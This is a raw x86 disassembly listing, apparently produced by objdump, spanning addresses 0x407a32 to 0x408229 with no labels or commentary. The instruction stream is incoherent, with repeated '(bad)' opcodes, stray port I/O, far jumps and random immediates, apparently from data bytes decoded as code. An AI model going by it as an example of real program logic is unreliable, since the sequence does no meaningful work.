  407a32:	arpl   bp,dx
  407a34:	adc    DWORD PTR [ecx+0x4],ebx
  407a37:	nop
  407a38:	cmp    al,0xf6
  407a3a:	mov    ebx,0x1b1f87ba
  407a3f:	dec    ebp
  407a40:	call   0x59a4:0x16c8d45f
  407a47:	cli    
  407a48:	clc    
  407a49:	(bad)  
  407a4a:	jmp    0x407a0e
  407a4c:	push   ds
  407a4d:	mov    al,ds:0xa182a9ef
  407a52:	sub    BYTE PTR [ebx],bh
  407a54:	lods   al,BYTE PTR ds:[esi]
  407a55:	outs   dx,DWORD PTR ds:[esi]
  407a56:	test   eax,0xcb216448
  407a5c:	mov    esi,0x44adc413
  407a61:	push   cs
  407a62:	sbb    DWORD PTR [edx],esp
  407a64:	inc    ecx
  407a65:	adc    eax,0xa3aa7a5
  407a6a:	cmp    dh,BYTE PTR [edi+0x7e8b4c2c]
  407a70:	dec    ebx
  407a71:	cmp    eax,0x25879b94
  407a76:	mov    eax,ds:0x759db448
  407a7b:	mov    ebp,0x36471f99
  407a80:	pop    esp
  407a81:	in     eax,0x4
  407a83:	div    DWORD PTR [ecx-0x40]
  407a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a87:	dec    esp
  407a88:	mov    ah,0x42
  407a8a:	jl     0x407a44
  407a8c:	sbb    ah,BYTE PTR [ecx-0x45089c55]
  407a92:	mov    dl,0x52
  407a94:	je     0x407ad6
  407a96:	push   esp
  407a97:	mul    DWORD PTR [ecx+0x47]
  407a9a:	push   edx
  407a9b:	into   
  407a9c:	push   edx
  407a9d:	retf   0x5979
  407aa0:	jnp    0x407a38
  407aa2:	push   cs
  407aa3:	fcomi  st,st(1)
  407aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa6:	lock cmp cl,ah
  407aa9:	lds    ebx,FWORD PTR [ebp+0x1a532469]
  407aaf:	mov    esi,0xe0df90b5
  407ab4:	sub    eax,0x8b008c3c
  407ab9:	test   dh,0xb9
  407abc:	lds    edx,FWORD PTR [ecx-0x71d8a994]
  407ac2:	and    eax,0xb44777b8
  407ac7:	push   edi
  407ac8:	sbb    bl,dl
  407aca:	jnp    0x407ab8
  407acc:	mov    cl,0xa2
  407ace:	sub    ebp,DWORD PTR [edi]
  407ad0:	int    0x49
  407ad2:	pop    eax
  407ad3:	fadd   QWORD PTR [esi+0x6b1e196b]
  407ad9:	jbe    0x407af4
  407adb:	mov    dl,al
  407add:	nop
  407ade:	leave  
  407adf:	cmp    dh,cl
  407ae1:	xor    ebp,DWORD PTR [ecx-0x10]
  407ae4:	mov    edi,0xa19cb3a8
  407ae9:	stc    
  407aea:	jno    0x407afc
  407aec:	test   BYTE PTR [edi],dl
  407aee:	mov    dl,0xdf
  407af0:	(bad)  
  407af1:	xor    ecx,DWORD PTR [esp+ebp*8+0x45e82da1]
  407af8:	xchg   esp,eax
  407af9:	cld    
  407afa:	jmp    0x407b2c
  407afc:	push   ecx
  407afd:	dec    ebp
  407afe:	mov    edx,0x23952638
  407b03:	mov    es,WORD PTR [ebx]
  407b05:	adc    BYTE PTR [edx+eiz*8],0x3a
  407b09:	das    
  407b0a:	xor    eax,0x83382aad
  407b0f:	(bad)  
  407b10:	pop    esi
  407b11:	dec    edi
  407b12:	jno    0x407ab7
  407b14:	sbb    ebx,esi
  407b16:	inc    ecx
  407b17:	test   cl,bl
  407b19:	xchg   ebx,eax
  407b1a:	jb     0x407abe
  407b1c:	fdiv   DWORD PTR [ecx-0x4c11f985]
  407b22:	lahf   
  407b23:	sahf   
  407b24:	es mov ah,0x6
  407b27:	or     BYTE PTR [esi],dl
  407b29:	mov    bh,0x10
  407b2b:	jne    0x407b69
  407b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2e:	jae    0x407b9d
  407b30:	ret    
  407b31:	popa   
  407b32:	retf   
  407b33:	add    eax,DWORD PTR ds:0x14bf2757
  407b39:	hlt    
  407b3a:	pop    edi
  407b3b:	div    DWORD PTR [ecx+0x5f86c487]
  407b41:	mov    ss,WORD PTR [esi]
  407b43:	jo     0x407b8c
  407b45:	mov    esp,0xd9ee486e
  407b4a:	mov    eax,0xec87f0bf
  407b4f:	jmp    0x91c926f3
  407b54:	and    ebx,DWORD PTR [edx+0x51]
  407b57:	xor    esi,esi
  407b59:	shl    bl,1
  407b5b:	sahf   
  407b5c:	jmp    0x7e9f4d32
  407b61:	in     eax,0xf1
  407b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b64:	sub    edx,DWORD PTR ds:0x50565f03
  407b6a:	sbb    eax,0x24dfb9bb
  407b6f:	je     0x407b98
  407b71:	mov    edi,0x4d53dfa0
  407b76:	mov    ds:0x2493b28c,eax
  407b7b:	ret    
  407b7c:	call   0xdcf1:0x912c95cf
  407b83:	stos   DWORD PTR es:[edi],eax
  407b84:	mov    al,ds:0x7aecdc16
  407b89:	retf   0xd77d
  407b8c:	aam    0x43
  407b8e:	xchg   edx,eax
  407b8f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b91:	mov    eax,esp
  407b93:	sub    al,0x5b
  407b95:	hlt    
  407b96:	or     DWORD PTR [ebp+0x2f],0xb61e2b7d
  407b9d:	mov    edx,0xd1aeba99
  407ba2:	cmp    esi,DWORD PTR [ecx+0x417a64ce]
  407ba8:	das    
  407ba9:	ret    0x1c29
  407bac:	add    DWORD PTR [esi-0x26],edx
  407baf:	sahf   
  407bb0:	ffree  st(6)
  407bb2:	sbb    BYTE PTR [esi-0x31b1fe69],0xb0
  407bb9:	ret    
  407bba:	push   edx
  407bbb:	sbb    al,0x58
  407bbd:	adc    al,0x1a
  407bbf:	retf   0x22f
  407bc2:	mov    edi,0x63cbed43
  407bc7:	ficomp WORD PTR [ecx+0x39]
  407bca:	cld    
  407bcb:	sub    eax,0x67052c37
  407bd0:	jle    0x407bcc
  407bd2:	add    ch,al
  407bd4:	scas   al,BYTE PTR es:[edi]
  407bd5:	xchg   edx,eax
  407bd6:	adc    ebp,edx
  407bd8:	sbb    bl,0xa7
  407bdb:	jbe    0x407be4
  407bdd:	xor    BYTE PTR [ecx-0x77],dl
  407be0:	out    0x24,eax
  407be2:	xchg   ebp,eax
  407be3:	test   al,0x7f
  407be5:	int    0x46
  407be7:	inc    esp
  407be8:	xchg   ebp,eax
  407be9:	outs   dx,BYTE PTR ds:[esi]
  407bea:	xchg   esi,eax
  407beb:	loopne 0x407c02
  407bed:	and    cl,BYTE PTR [edx-0x70]
  407bf0:	jg     0x407bf0
  407bf2:	jnp    0x407c53
  407bf4:	sub    BYTE PTR [eax-0x4e],0x9d
  407bf8:	mov    esi,0x11267fce
  407bfd:	out    0xaf,al
  407bff:	test   al,0xef
  407c01:	push   ebx
  407c02:	pop    ds
  407c03:	test   DWORD PTR es:[eax+0x38],ecx
  407c07:	sub    BYTE PTR ds:0x61da827d,dh
  407c0d:	das    
  407c0e:	push   es
  407c0f:	push   edx
  407c10:	adc    BYTE PTR ds:0x8af00675,dh
  407c16:	fs cmp eax,0xa6968e61
  407c1c:	mov    esi,0x4e9e8459
  407c21:	fnstcw WORD PTR [edi-0x30]
  407c24:	fild   WORD PTR [ebx+0x5dd0f408]
  407c2a:	pop    edi
  407c2b:	mov    al,ds:0x42e2b7a1
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0x373825e6,cl
  407c46:	cwde   
  407c47:	push   es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	daa    
  407c50:	jp     0x407cb2
  407c52:	cdq    
  407c53:	ror    BYTE PTR [edi+0x57],0x5b
  407c57:	popf   
  407c58:	push   esi
  407c59:	in     al,dx
  407c5a:	dec    edi
  407c5b:	mov    esp,0xc2850e9f
  407c60:	adc    eax,0xa226138c
  407c65:	int3   
  407c66:	mov    bh,0x77
  407c68:	inc    esi
  407c69:	pop    ebp
  407c6a:	mov    ecx,0x82839452
  407c6f:	xor    esp,DWORD PTR [ebp+0x17]
  407c72:	jge    0x407c74
  407c74:	xor    cl,bl
  407c76:	test   DWORD PTR [edx+0x3cebbc0b],ebp
  407c7c:	data16 outs dx,BYTE PTR ds:[esi]
  407c7e:	not    DWORD PTR [edx+0x7d50ed27]
  407c84:	ds out dx,al
  407c86:	cmp    BYTE PTR [ebx+ecx*8+0x368535b1],cl
  407c8d:	inc    esi
  407c8e:	into   
  407c8f:	(bad)  [edx]
  407c91:	fild   WORD PTR [esi]
  407c93:	dec    ebp
  407c94:	inc    edx
  407c95:	sub    eax,edx
  407c97:	mov    edx,0x8a8ff70c
  407c9c:	inc    cx
  407c9e:	jae    0x407cc0
  407ca0:	jns    0x407cc4
  407ca2:	sbb    eax,DWORD PTR [ecx+0x16]
  407ca5:	inc    eax
  407ca6:	arpl   WORD PTR ds:[edi-0x4b25212f],si
  407cad:	jnp    0x407c8f
  407caf:	aam    0xa3
  407cb1:	pusha  
  407cb2:	mov    ah,0xc7
  407cb4:	cli    
  407cb5:	(bad)  
  407cb6:	mov    dh,0x7c
  407cb8:	push   0xbf6c4a4
  407cbd:	inc    edx
  407cbe:	and    BYTE PTR [edx+edx*4],dl
  407cc1:	cdq    
  407cc2:	nop
  407cc3:	and    BYTE PTR [esi-0x71bbd626],al
  407cc9:	je     0x407c7a
  407ccb:	or     esp,ebx
  407ccd:	pushf  
  407cce:	aaa    
  407ccf:	mov    al,ss:0x7905edcc
  407cd5:	div    DWORD PTR [eax+0x76460ee3]
  407cdb:	adc    BYTE PTR [edx-0x5ea671cf],0xab
  407ce2:	jb     0x407cc4
  407ce4:	rcr    DWORD PTR [ebx-0x61],1
  407ce7:	(bad)  
  407ce9:	gs push cs
  407ceb:	outs   dx,DWORD PTR ds:[esi]
  407cec:	loopne 0x407d05
  407cee:	adc    BYTE PTR [edx+0x14235c92],0xc4
  407cf5:	cmc    
  407cf6:	ins    DWORD PTR es:[edi],dx
  407cf7:	bound  eax,QWORD PTR [eax+ecx*8+0x37]
  407cfb:	inc    ebp
  407cfc:	stos   BYTE PTR es:[edi],al
  407cfd:	pop    ss
  407cfe:	xchg   edi,eax
  407cff:	out    0xf,eax
  407d01:	(bad)  
  407d02:	mov    dh,0xd3
  407d04:	lds    edx,FWORD PTR [esi]
  407d06:	add    BYTE PTR [esi+0x718328e4],dl
  407d0c:	in     eax,0x5c
  407d0e:	adc    BYTE PTR ds:0x8c7ce0b8,0xd1
  407d15:	push   ds
  407d16:	pop    esi
  407d17:	jne    0x407caf
  407d19:	idiv   DWORD PTR [esi]
  407d1b:	sbb    eax,0x8c81e4e4
  407d20:	idiv   al
  407d22:	push   ebp
  407d23:	sbb    DWORD PTR ds:0x75449fb8,esi
  407d29:	fsub   DWORD PTR [edi-0xbda6db1]
  407d2f:	(bad)  
  407d30:	rol    DWORD PTR [esi+0x75],1
  407d33:	and    DWORD PTR [edx-0x1242c4c4],edx
  407d39:	pusha  
  407d3a:	ror    BYTE PTR [esi+0x68],cl
  407d3d:	mov    bl,0xa
  407d3f:	out    dx,eax
  407d40:	retf   0x6d4a
  407d43:	pop    ds
  407d44:	test   BYTE PTR [esi-0x19],ch
  407d47:	fstp   QWORD PTR ds:0xa9640456
  407d4d:	cmp    ecx,ecx
  407d4f:	rcl    BYTE PTR [ebp+ebp*8-0x3d],cl
  407d53:	push   eax
  407d54:	sbb    eax,0x35cd4409
  407d59:	ins    BYTE PTR es:[edi],dx
  407d5a:	add    al,0x0
  407d5c:	jmp    0x6f31:0xe4785cee
  407d63:	push   ecx
  407d64:	mov    WORD PTR [ecx-0x3fc3db6f],fs
  407d6a:	(bad)  
  407d6c:	mov    WORD PTR [ebx],?
  407d6e:	mov    eax,ds:0x161c307d
  407d73:	jnp    0x407d8d
  407d75:	xor    cl,BYTE PTR [edx-0x795215da]
  407d7b:	int3   
  407d7c:	inc    ebx
  407d7d:	fdiv   DWORD PTR [esi+eax*1]
  407d80:	pusha  
  407d81:	mov    cs,ecx
  407d83:	mov    esp,0x7d940ff3
  407d88:	enter  0xde25,0xd0
  407d8c:	pop    ss
  407d8d:	cli    
  407d8e:	add    ebx,DWORD PTR [ecx+0x44]
  407d91:	inc    ebx
  407d92:	lock mov edx,0x1bb933cf
  407d98:	jno    0x407d85
  407d9a:	push   ebx
  407d9b:	or     BYTE PTR [eax+0x29],bl
  407d9e:	xor    dl,bh
  407da0:	inc    ebx
  407da1:	mov    edx,0x5e482ff9
  407da6:	push   ecx
  407da7:	inc    esp
  407da8:	inc    ebx
  407da9:	adc    BYTE PTR [ecx+0x3c48b8a],bl
  407daf:	lock nop
  407db1:	call   0x67de:0x268f114f
  407db8:	ins    BYTE PTR es:[edi],dx
  407db9:	retf   0xa117
  407dbc:	mov    fs,WORD PTR [ebx-0x369f3927]
  407dc2:	mov    dl,0x57
  407dc4:	in     al,0x35
  407dc6:	dec    edx
  407dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc8:	xchg   esi,eax
  407dc9:	jne    0x407dbf
  407dcb:	mov    esp,0x7aad80bf
  407dd0:	jecxz  0x407dc0
  407dd2:	mov    DWORD PTR [ebp+0x6f],esp
  407dd5:	sub    eax,0xf3f0bb6c
  407dda:	push   ebp
  407ddb:	xchg   esp,eax
  407ddc:	out    0x45,al
  407dde:	ror    DWORD PTR [ebx+0x1658c0e6],cl
  407de4:	js     0x407e5b
  407de6:	ror    BYTE PTR [eax+eiz*1],cl
  407de9:	loopne 0x407df6
  407deb:	aas    
  407dec:	push   ss
  407ded:	inc    ebp
  407dee:	mov    ah,BYTE PTR [ebx-0x76]
  407df1:	adc    eax,0xf718023f
  407df6:	sbb    ebp,DWORD PTR [esi+0x5ddfa2c6]
  407dfc:	dec    ebp
  407dfd:	and    ebp,DWORD PTR [edx+esi*1]
  407e00:	out    dx,al
  407e01:	popf   
  407e02:	aam    0x79
  407e04:	scas   al,BYTE PTR es:[edi]
  407e05:	cmp    edx,edx
  407e07:	push   ebp
  407e08:	cwde   
  407e09:	inc    esi
  407e0a:	jg     0x407e05
  407e0c:	ins    DWORD PTR es:[edi],dx
  407e0d:	pop    ebp
  407e0e:	test   DWORD PTR ds:0x1115f651,esp
  407e14:	xchg   edi,eax
  407e15:	inc    esi
  407e16:	jl     0x407e5c
  407e18:	and    cl,BYTE PTR [eax]
  407e1a:	cs cmovo esi,ebp
  407e1e:	xor    ebp,ebx
  407e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e21:	test   al,0x98
  407e23:	imul   edx,DWORD PTR [eax-0x1d7ee671],0x81e9cdda
  407e2d:	cmp    eax,0xcdca6ca2
  407e32:	jg     0x407dbf
  407e34:	mov    fs,ecx
  407e36:	std    
  407e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e38:	inc    esi
  407e39:	mov    WORD PTR [esi-0x15d59446],fs
  407e3f:	ja     0x407df6
  407e41:	int    0x18
  407e43:	inc    edx
  407e44:	fstp   DWORD PTR [eax+0x4fa71f97]
  407e4a:	fsub   st,st(0)
  407e4c:	icebp  
  407e4d:	mov    ebx,0x7096c018
  407e52:	lods   al,BYTE PTR ss:[esi]
  407e54:	rcr    BYTE PTR [edx],1
  407e56:	sbb    al,0x21
  407e58:	inc    edx
  407e59:	mov    dh,al
  407e5b:	and    bh,BYTE PTR [edx]
  407e5d:	mov    ds:0x5d29fcdc,eax
  407e62:	call   0x48358a37
  407e67:	push   es
  407e68:	jmp    0x407dfb
  407e6a:	adc    al,0x1
  407e6c:	ss push ecx
  407e6e:	in     eax,0x6
  407e70:	xchg   ecx,eax
  407e71:	lea    esi,[edi+0x2c]
  407e74:	jp     0x407e6a
  407e76:	pop    ebp
  407e77:	sbb    BYTE PTR [ecx],bh
  407e79:	xlat   BYTE PTR ds:[ebx]
  407e7a:	jne    0x407e9f
  407e7c:	pop    esp
  407e7d:	inc    esp
  407e7e:	fmul   QWORD PTR cs:[ecx+edx*4]
  407e82:	rcr    BYTE PTR [edi],1
  407e84:	stc    
  407e85:	fsub   DWORD PTR [ebp-0x45]
  407e88:	(bad)  
  407e89:	in     al,dx
  407e8a:	push   es
  407e8b:	jno    0x407e2f
  407e8d:	out    dx,eax
  407e8e:	push   eax
  407e8f:	push   edi
  407e90:	mov    ds:0x67be91f0,al
  407e95:	and    bh,BYTE PTR [edi-0x6e4e1846]
  407e9b:	mov    ecx,0x64d56e0e
  407ea0:	ret    0x30f2
  407ea3:	inc    ebx
  407ea4:	xchg   edx,eax
  407ea5:	and    edx,edx
  407ea7:	dec    ebx
  407ea8:	cmp    esp,DWORD PTR [ebp-0x4797558a]
  407eae:	cmp    bl,BYTE PTR [edx+0x10]
  407eb1:	mov    esp,0x74cdb95a
  407eb6:	cwde   
  407eb7:	out    0x8f,eax
  407eb9:	ret    0xe057
  407ebc:	jecxz  0x407ee3
  407ebe:	sbb    al,0x38
  407ec0:	ret    
  407ec1:	das    
  407ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec3:	out    dx,al
  407ec4:	sbb    esi,DWORD PTR [ecx-0x79]
  407ec7:	mov    dh,0x45
  407ec9:	push   ds
  407eca:	mov    dl,0x17
  407ecc:	shr    DWORD PTR [edi-0x12d597c9],cl
  407ed2:	loope  0x407e67
  407ed4:	dec    eax
  407ed5:	ja     0x407f1f
  407ed7:	shr    DWORD PTR [ebp+0x190bf752],cl
  407edd:	in     al,0x9e
  407edf:	cwde   
  407ee0:	fild   WORD PTR [ebp-0x53]
  407ee3:	lea    edi,[edi]
  407ee5:	mov    ebx,0x5ee2bae5
  407eea:	inc    ebx
  407eeb:	add    cl,al
  407eed:	adc    BYTE PTR [eax+0x1f],bl
  407ef0:	cmp    ecx,esp
  407ef2:	pop    ebx
  407ef3:	or     ebp,DWORD PTR [ebp+0x26]
  407ef6:	mov    bh,0xc8
  407ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ef9:	adc    eax,0xcec8aaa2
  407efe:	(bad)
  407f02:	das    
  407f03:	mov    dl,0x79
  407f05:	dec    esp
  407f06:	ja     0x407e8e
  407f08:	dec    edx
  407f09:	mov    ds:0x8d7f91ee,al
  407f0e:	in     eax,0x6f
  407f10:	jae    0x407f29
  407f12:	test   al,0x29
  407f14:	jmp    0xae7d:0xfb79b5bc
  407f1b:	mov    ds:0x4c971f29,eax
  407f20:	sbb    bh,cl
  407f22:	jl     0x407f94
  407f24:	in     eax,0xe4
  407f26:	rcr    DWORD PTR [ebp+ebx*8+0x21],1
  407f2a:	xchg   ebx,eax
  407f2b:	mov    ch,0x6f
  407f2d:	retf   0x2409
  407f30:	pop    ss
  407f31:	pop    edx
  407f32:	mov    edi,0x26ec3942
  407f37:	outs   dx,BYTE PTR ds:[esi]
  407f38:	jns    0x407ed9
  407f3a:	in     al,dx
  407f3b:	mov    ch,0x11
  407f3d:	cmp    al,0xe9
  407f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f40:	(bad)  
  407f41:	or     al,0x5f
  407f43:	test   eax,0x4985be7a
  407f48:	mov    eax,0xa8a83e3
  407f4d:	ins    BYTE PTR es:[edi],dx
  407f4e:	pop    ecx
  407f4f:	sub    edi,DWORD PTR [edi]
  407f51:	retf   
  407f52:	ret    
  407f53:	sbb    cl,ah
  407f55:	es mov edx,0xa6b5fb2d
  407f5b:	and    DWORD PTR [esi-0x9],ebx
  407f5e:	xlat   BYTE PTR ds:[ebx]
  407f5f:	xor    BYTE PTR [ebp+0x6dd8ddea],al
  407f65:	pusha  
  407f66:	mov    eax,ds:0x2a4304b4
  407f6b:	stos   DWORD PTR es:[edi],eax
  407f6c:	in     eax,dx
  407f6d:	jle    0x407fc4
  407f6f:	push   ebp
  407f70:	or     bh,BYTE PTR [ebx]
  407f72:	call   DWORD PTR [ebp+0x18]
  407f75:	sti    
  407f76:	pop    ebp
  407f77:	push   edx
  407f78:	cmp    BYTE PTR [ebp+0xaa613f2],cl
  407f7e:	arpl   WORD PTR [eax+ecx*8],sp
  407f81:	loope  0x407f37
  407f83:	int3   
  407f84:	sub    BYTE PTR [esi],0x19
  407f87:	mov    edx,0xf3cf7766
  407f8c:	aas    
  407f8d:	jne    0x407fdc
  407f8f:	mov    ch,0x5e
  407f91:	and    BYTE PTR [ebp+0x231eb923],ah
  407f97:	xchg   edx,eax
  407f98:	push   0xe9f3d769
  407f9d:	retf   
  407f9e:	mov    dh,ah
  407fa0:	pushf  
  407fa1:	mov    bl,0x65
  407fa3:	test   BYTE PTR [esi-0x5e],al
  407fa6:	inc    esi
  407fa7:	aad    0xc5
  407fa9:	add    edx,edx
  407fab:	in     eax,dx
  407fac:	mov    ah,0xab
  407fae:	push   0x48
  407fb0:	pop    ecx
  407fb1:	and    dl,BYTE PTR [eax-0x23]
  407fb4:	lock out dx,eax
  407fb6:	sbb    DWORD PTR ds:0xe5207a5a,ebx
  407fbc:	addr16 aam 0x13
  407fbf:	add    eax,0x926c29a6
  407fc4:	fxch   st(0)
  407fc6:	inc    ebx
  407fc7:	jne    0x407f85
  407fc9:	test   DWORD PTR [ecx+0x33],eax
  407fcc:	into   
  407fcd:	iret   
  407fce:	xor    ah,BYTE PTR [edx+0x2e]
  407fd1:	adc    eax,0x6af067a8
  407fd6:	pop    edi
  407fd7:	mov    ah,0x3d
  407fd9:	mov    DWORD PTR [ebp+0x5a],edi
  407fdc:	mov    dl,0x7f
  407fde:	es out 0xfe,al
  407fe1:	rol    BYTE PTR [ecx],1
  407fe3:	pop    eax
  407fe4:	or     bl,BYTE PTR [eax-0x75]
  407fe7:	cdq    
  407fe8:	dec    esi
  407fe9:	jne    0x408053
  407feb:	dec    edi
  407fec:	sbb    DWORD PTR [ecx-0x400ddf0e],0x9492fefe
  407ff6:	and    eax,0xa5765315
  407ffb:	test   BYTE PTR [edi+edx*2],0x9c
  407fff:	xchg   DWORD PTR [ecx],ebx
  408001:	pop    ebp
  408002:	aad    0x37
  408004:	aaa    
  408005:	xchg   ebp,eax
  408006:	or     dl,BYTE PTR [edx-0x7164406b]
  40800c:	or     BYTE PTR [eax-0x74],cl
  40800f:	(bad)  
  408010:	mov    edi,0x924d16e7
  408015:	(bad)  
  408016:	fld    TBYTE PTR [edx-0x3b161133]
  40801c:	cdq    
  40801d:	push   edx
  40801e:	cmp    al,0x8e
  408020:	fild   DWORD PTR ds:0xeb577c89
  408026:	xchg   esp,eax
  408027:	mov    WORD PTR [eax],ss
  408029:	inc    esp
  40802a:	jmp    0x743f:0xc1ba5d41
  408031:	stc    
  408032:	sub    DWORD PTR [ebx-0x70],ebx
  408035:	and    eax,0x2f650288
  40803a:	jae    0x4080a4
  40803c:	push   0x19a68d2d
  408041:	xor    ecx,0x597a8cb0
  408047:	clc    
  408048:	pop    es
  408049:	sub    BYTE PTR ds:0xbf36859d,dh
  40804f:	mov    ds:0x75fe0945,eax
  408054:	mov    eax,gs:0xb5de1e6d
  40805a:	jp     0x4080d1
  40805c:	pop    ebx
  40805d:	in     eax,0xa2
  40805f:	enter  0x84e1,0xc
  408063:	shl    DWORD PTR [ebx+0x8fe4cd6],1
  408069:	mov    ch,0x47
  40806b:	mov    ebp,0xbcce3b38
  408070:	dec    DWORD PTR [eax+ebx*2-0x7f056da6]
  408077:	bound  esi,QWORD PTR ds:0xe126e527
  40807d:	dec    ebx
  40807e:	sbb    al,0xce
  408080:	in     al,dx
  408081:	inc    edx
  408082:	xchg   BYTE PTR [ebx],cl
  408084:	fistp  WORD PTR [edi-0x7121cc9c]
  40808a:	push   0xffffffa0
  40808c:	int3   
  40808d:	sub    edx,DWORD PTR [edi-0x1e01ffb7]
  408093:	pop    ecx
  408094:	jmp    0x408073
  408096:	frstor [esp+eiz*2]
  408099:	stos   BYTE PTR es:[edi],al
  40809a:	test   BYTE PTR [edx-0x286e7ee3],0xbc
  4080a1:	or     edi,DWORD PTR [ecx-0x70]
  4080a4:	rcl    DWORD PTR [edi],0x9a
  4080a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080a8:	xor    eax,0x547d05de
  4080ad:	pf2iw  mm2,mm2
  4080b1:	ja     0x40811a
  4080b3:	stc    
  4080b4:	mov    ecx,DWORD PTR [ecx+0x6b]
  4080b7:	xor    eax,0xd18e41d7
  4080bc:	jmp    0x15ef:0xc10557ca
  4080c3:	fsubr  st,st(6)
  4080c5:	mov    ds:0x3d7e6f08,al
  4080ca:	xlat   BYTE PTR ds:[ebx]
  4080cb:	pushf  
  4080cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080cd:	retf   
  4080ce:	call   0x1409:0x77a0fa2a
  4080d5:	add    BYTE PTR fs:[esi-0x427ad0e9],ch
  4080dc:	(bad)  
  4080dd:	mov    esp,0x8d53ed55
  4080e2:	add    eax,0xa46803e5
  4080e7:	ss shr edx,1
  4080ea:	cmp    eax,0x8a1a96b9
  4080ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f0:	inc    esp
  4080f1:	hlt    
  4080f2:	or     eax,0x65bea12a
  4080f7:	mov    ebp,0xcf67e3a7
  4080fc:	inc    eax
  4080fd:	int3   
  4080fe:	imul   ecx,DWORD PTR gs:[edi-0x39],0x35
  408103:	div    al
  408105:	pop    edx
  408106:	bound  edx,QWORD PTR [ebp+0x71]
  408109:	es jecxz 0x408178
  40810c:	shr    DWORD PTR [edx-0x7f444af5],0xdd
  408113:	dec    ebp
  408114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408115:	jbe    0x4080d4
  408117:	sub    cl,0xd4
  40811a:	push   esp
  40811b:	jae    0x4080ea
  40811d:	scas   eax,DWORD PTR es:[edi]
  40811e:	and    ebp,DWORD PTR [esi-0x22]
  408121:	sub    DWORD PTR [ebx+0x794fd698],ebp
  408127:	push   ebp
  408128:	mov    esi,DWORD PTR [edx-0x53d1339]
  40812e:	adc    eax,0x2861d64c
  408133:	sbb    al,bl
  408135:	pop    ss
  408136:	leave  
  408137:	ror    DWORD PTR [ebp+0x2c],1
  40813a:	push   ecx
  40813b:	push   esp
  40813c:	xor    dh,ch
  40813e:	dec    ecx
  40813f:	mul    DWORD PTR [eax+0x799d0c79]
  408145:	adc    al,0xfa
  408147:	mov    ecx,0x3365bb94
  40814c:	sub    eax,0x7be4994e
  408151:	xor    esi,eax
  408153:	add    DWORD PTR [esi-0x5d6b543],esp
  408159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40815a:	xchg   ebx,ebp
  40815c:	and    BYTE PTR [ecx-0x16ac2562],dh
  408162:	in     al,dx
  408163:	xor    DWORD PTR [edx],esp
  408165:	cmp    al,BYTE PTR [ebp-0x51]
  408168:	mov    bl,0x7e
  40816a:	(bad)  
  40816b:	xlat   BYTE PTR ds:[ebx]
  40816c:	mov    es,WORD PTR [ebx]
  40816e:	xchg   edx,eax
  40816f:	pmaxub mm7,QWORD PTR [ecx+0x6a]
  408173:	sti    
  408174:	or     bl,BYTE PTR [esi-0x23036cf5]
  40817a:	or     esi,DWORD PTR [ebp+0x6f]
  40817d:	mov    esi,0x53d65213
  408182:	sub    ecx,edx
  408184:	pop    ebp
  408185:	mov    ebp,0xfaea8f21
  40818a:	ret    
  40818b:	cdq    
  40818c:	adc    BYTE PTR [edi],al
  40818e:	dec    ebx
  40818f:	stos   DWORD PTR es:[edi],eax
  408190:	mov    ah,0xb6
  408192:	dec    ebx
  408193:	mov    ch,0xb
  408195:	fsubr  QWORD PTR [ebx+edx*4]
  408198:	jle    0x4081ff
  40819a:	pop    ebx
  40819b:	push   eax
  40819c:	sar    DWORD PTR [ecx-0x14eb589b],0x70
  4081a3:	cmp    BYTE PTR [ebx+0x7e],ch
  4081a6:	shr    DWORD PTR [eax+edi*4+0x5f944286],1
  4081ad:	call   0x54cdc24
  4081b2:	or     esp,esp
  4081b4:	pop    edx
  4081b5:	ja     0x4081c8
  4081b7:	sbb    DWORD PTR [ebp-0x1e],edx
  4081ba:	xor    eax,0x3eb285fe
  4081bf:	cdq    
  4081c0:	sub    al,0x71
  4081c2:	mov    BYTE PTR [ecx-0x6b643bce],bl
  4081c8:	scas   al,BYTE PTR es:[edi]
  4081c9:	sbb    eax,0xd8febadd
  4081ce:	sbb    eax,0xa4d553a
  4081d3:	dec    esp
  4081d4:	lods   al,BYTE PTR ds:[esi]
  4081d5:	and    al,0x23
  4081d7:	fstp   QWORD PTR [ebp+0x6ead1288]
  4081dd:	adc    eax,0xa0cdc1be
  4081e2:	push   esp
  4081e3:	and    ebx,0x625e0a5e
  4081e9:	pop    ecx
  4081ea:	adc    eax,0x23c3af44
  4081ef:	ins    DWORD PTR es:[edi],dx
  4081f0:	mov    fs,WORD PTR [edx+0x6876cb87]
  4081f6:	mov    esi,0xf9530dee
  4081fb:	pop    edx
  4081fc:	sbb    BYTE PTR [eax-0x13e99f76],al
  408202:	lds    edx,FWORD PTR [edx]
  408204:	mov    esp,0x19fac818
  408209:	and    BYTE PTR [ecx-0x52],bl
  40820c:	int    0x28
  40820e:	jno    0x40823e
  408210:	or     ecx,0x42
  408213:	push   cs
  408214:	xchg   ebp,eax
  408215:	outs   dx,DWORD PTR ds:[esi]
  408216:	sub    al,0x46
  408218:	pop    ds
  408219:	lahf   
  40821a:	add    ebp,0xffffffb3
  40821d:	pop    esp
  40821e:	xor    esi,esp
  408220:	addr16 push esp
  408222:	enter  0xb1e7,0x68
  408226:	ret    0x68db
  408229:	inc    edi
